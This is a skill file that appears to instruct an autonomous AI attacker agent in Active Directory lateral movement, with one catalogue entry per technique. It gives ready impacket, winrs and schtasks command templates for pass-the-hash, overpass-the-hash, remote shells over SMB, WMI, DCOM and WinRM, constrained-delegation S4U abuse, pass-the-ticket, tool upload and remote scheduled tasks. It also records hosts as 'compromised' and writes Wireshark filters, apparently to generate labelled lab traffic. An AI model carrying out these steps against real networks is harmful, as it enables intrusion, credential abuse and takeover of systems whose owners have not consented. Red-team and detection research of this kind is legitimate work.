---
name: ad-lateral
description: Lateral-movement Active Directory skill for an attacker agent on a domain-joined Windows host. Covers pass-the-hash, remote shells, delegation, pass-the-ticket, WinRM, and scheduled tasks. Load this skill when the task names ad-lateral. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Lateral Movement Skill

Load this skill **only** when the dispatched task names `ad-lateral`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

# Phase 3: Lateral Movement

## 3.1 Pass-the-Hash (PsExec)

- Technique id: `lateral.pth-psexec`
- ATT&CK: T1550.002 (Use Alternate Authentication Material: Pass the Hash)

Purpose: authenticate to a host over SMB with a captured NTLM hash using PsExec.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.psexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

If the LM half is known, pass `-hashes <lm-hash>:<ntlm-hash>`.

Outputs: mark the target host `compromised`:

```
python scripts/state.py merge hosts[<index>] '{"compromised": true}'
```

Rollback: if authentication fails with the hash, `mark-stale` the user object and re-run `credential.dump-secrets` or `credential.dcsync` to refresh the hash.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 3.2 Pass-the-Hash (WMI)
- Technique id: `lateral.pth-wmiexec`
- ATT&CK: T1550.002 (Pass the Hash)

Purpose: authenticate to a host over WMI with a captured NTLM hash.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: mark the target host `compromised`.

Rollback: if authentication fails, `mark-stale` the user object and refresh the hash.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 3.3 Pass-the-Hash (SMBExec)
- Technique id: `lateral.pth-smbexec`
- ATT&CK: T1550.002 (Pass the Hash)

Purpose: authenticate to a host over SMB named pipes with a captured NTLM hash.

Inputs: a user object with `ntlm_hash` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.smbexec -hashes :<ntlm-hash> <domain.name>/<user>@<target-ip>
```

Outputs: mark the target host `compromised`.

Rollback: if authentication fails, `mark-stale` the user object and refresh the hash.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 3.4 Over-Pass-the-Hash
- Technique id: `lateral.overpass-the-hash`
- ATT&CK: T1550.002 (Pass the Hash, ticket-producing variant)

Purpose: request a Kerberos TGT directly from an NTLM hash, then use the ticket.

Inputs: a user object with `ntlm_hash` (or `kerberos_aes256`) from `users`.

Procedure (one atomic action):

```
python -m impacket.examples.getTGT <domain.name>/<user> -hashes :<ntlm-hash>
```

Import the resulting cache, then use it with `-k -no-pass` (Kerberos only, by FQDN):

```
$env:KRB5CCNAME = "<user>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<user>@<target-fqdn>
```

Outputs:

```
python scripts/state.py add tickets.tgt '{"principal": "<user>", "ccache_file": "<user>.ccache"}'
```

Rollback: if the TGT is expired or rejected, `mark-stale` the ticket entry and re-request it from a refreshed hash.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)) || (ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135))
```


## 3.5 Remote Shell (WMI)
- Technique id: `lateral.exec-wmiexec`
- ATT&CK: T1047 (Windows Management Instrumentation)

Purpose: obtain a remote shell on a target over WMI with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if WMI fails on a target (service disabled, port filtered), `mark-stale` the host object and re-run the port scan to pick an available method.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 3.6 Remote Shell (SMBExec)
- Technique id: `lateral.exec-smbexec`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares)

Purpose: obtain a remote shell on a target over SMB named pipes with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.smbexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if SMBExec fails, `mark-stale` the host object and re-run the port scan.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 3.7 Remote Shell (PsExec)
- Technique id: `lateral.exec-psexec`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares), T1569.002 (Service Execution)

Purpose: obtain a remote shell on a target over SMB with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.psexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if PsExec fails, `mark-stale` the host object and re-run the port scan.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 3.8 Remote Shell (DCOM)
- Technique id: `lateral.exec-dcomexec`
- ATT&CK: T1021.003 (Distributed Component Object Model)

Purpose: obtain a remote shell on a target over DCOM with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
python -m impacket.examples.dcomexec <domain.name>/<user>:<password>@<target-ip>
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if DCOM fails, `mark-stale` the host object and re-run the port scan.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || dcerpc || tcp.port == 135)
```


## 3.9 Remote Shell (AtExec)
- Technique id: `lateral.exec-atexec`
- ATT&CK: T1053.002 (Scheduled Task/Job: At)

Purpose: run a single scheduled command on a target over SMB with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host and the command to run.

Procedure (one atomic action):

```
python -m impacket.examples.atexec <domain.name>/<user>:<password>@<target-ip> "cmd /c whoami"
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if AtExec fails, `mark-stale` the host object and re-run the port scan.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```


## 3.10 Delegation Enumeration
- Technique id: `lateral.delegation-enum`
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets)

Purpose: discover delegation relationships in the domain.

Inputs: a user object with `password` from `users`, plus `domain.dc_ip`.

Procedure (one atomic action):

```
python -m impacket.examples.findDelegation <domain.name>/<user>:<password> -dc-ip <domain.dc_ip>
```

Interpret: `Unconstrained` captures inbound TGTs; `Constrained` enables S4U2self/S4U2proxy.

Outputs:

```
python scripts/state.py add domain.delegation '{"account": "<account>", "type": "constrained", "allowed_spns": ["<spn>"]}'
```

Rollback: if a delegation relationship is stale, `mark-stale` the entry and re-run this technique.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || tcp.port == 389 || tcp.port == 636)
```


## 3.11 Delegation Abuse (S4U)
- Technique id: `lateral.delegation-s4u`
- ATT&CK: T1558 (Steal or Forge Kerberos Tickets)

Purpose: abuse constrained delegation (S4U2self/S4U2proxy) to obtain a service ticket impersonating another user.

Inputs: a delegation account object from `users` carrying either a `password` or an `ntlm_hash`, a target `spn` from `domain.spns`, and the user to impersonate (a task-text intent, or pick a `users[]` entry with `is_domain_admin: true`). Prefer the `ntlm_hash` recovered read-only by `credential.dcsync`; never reset the delegation account's password to obtain plaintext.

Procedure (one atomic action) — hash form when only the NT hash is known:

```
python -m impacket.examples.getST -spn <spn> -impersonate <user-to-impersonate> -hashes :<ntlm-hash> -dc-ip <domain.dc_ip> <domain.name>/<delegation-account>
```

Password form (only when a plaintext password is already known without any password reset):

```
python -m impacket.examples.getST -spn <spn> -impersonate <user-to-impersonate> -dc-ip <domain.dc_ip> <domain.name>/<delegation-account>:<password>
```

Then use the resulting ticket with `-k -no-pass`.

Outputs:

```
python scripts/state.py add tickets.service '{"spn": "<spn>", "principal": "<user-to-impersonate>", "impersonated_user": "<user-to-impersonate>", "ccache_file": "<user-to-impersonate>.ccache"}'
```

Rollback: if the S4U request is rejected, `mark-stale` the delegation entry and re-run `lateral.delegation-enum`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)
```


## 3.12 Pass-the-Ticket
- Technique id: `lateral.pass-the-ticket`
- ATT&CK: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)

Purpose: reuse an existing Kerberos ticket (ccache) from `tickets.*` to authenticate.

Inputs: a ticket object from `tickets.tgt`/`service`/`golden`/`silver` (its `ccache_file` and `principal`) and the target host FQDN (from `hosts[].fqdn`, populated by `discovery.host-identify`).

Procedure (one atomic action):

```
$env:KRB5CCNAME = "<ccache-file>"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<principal>@<target-fqdn>
```

Outputs: mark the target host `compromised`:

```
python scripts/state.py merge hosts[<index>] '{"compromised": true}'
```

Rollback: if the ticket is expired or rejected, `mark-stale` the ticket object and re-obtain it (overpass-the-hash / golden / silver / delegation-s4u).

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (kerberos || smb || msrpc || tcp.port == 88 || tcp.port == 445 || tcp.port == 135)
```


## 3.13 Lateral Tool Transfer
- Technique id: `lateral.tool-transfer`
- ATT&CK: T1570 (Lateral Tool Transfer)

Purpose: upload a tool to a share on a target host.

Inputs: a user object with `password` from `users`, the target host and share name from `hosts`, and a local tool from `campaign` (`campaign.tools_dir` + a name in `campaign.tools`). If `campaign.tools` is empty, create a small benign tool file in `campaign.tools_dir` on the attack host first, record its name in `campaign.tools`, then proceed.

Procedure (one atomic action — connect, upload one file, exit):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside the client: `use <share>`, `put <campaign.tools_dir>/<tool>`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "\\\\<host>\\<share>\\<tool>", "description": "tool uploaded"}'
```

Rollback: if the share is unavailable, `mark-stale` the host object and re-run `discovery.share-enum`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 3.14 Remote Shell (WinRM)
- Technique id: `lateral.exec-winrm`
- ATT&CK: T1021.006 (Remote Services: Windows Remote Management)

Purpose: run a command on a target over WinRM (port 5985/5986) with plaintext credentials.

Inputs: a user object with `password` from `users`, plus the target host.

Procedure (one atomic action):

```
winrs -r:<target-fqdn> -u:<domain.name>\<user> -p:<password> "cmd /c whoami"
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if WinRM is disabled/unreachable, `mark-stale` the host and re-run `discovery.port-scan`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (tcp.port == 5985 || tcp.port == 5986)
```


## 3.15 Remote Scheduled Task
- Technique id: `lateral.exec-schtasks`
- ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)

Purpose: create and run a scheduled task on a target to execute a command with plaintext credentials.

Inputs: a user object with `password` from `users`, the target host, and the command to run.

Procedure (one atomic action — create, run, then delete):

```
schtasks /create /s <target-ip> /u <domain.name>\<user> /p <password> /tn "<attacker-task>" /tr "cmd /c <command>" /sc once /st 00:00 /f
schtasks /run /s <target-ip> /u <domain.name>\<user> /p <password> /tn "<attacker-task>"
schtasks /delete /s <target-ip> /u <domain.name>\<user> /p <password> /tn "<attacker-task>" /f
```

Outputs: mark the host `compromised`; record any files of interest under `files`.

Rollback: if task creation is denied, `mark-stale` the host and re-run `discovery.port-scan`.


Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
```

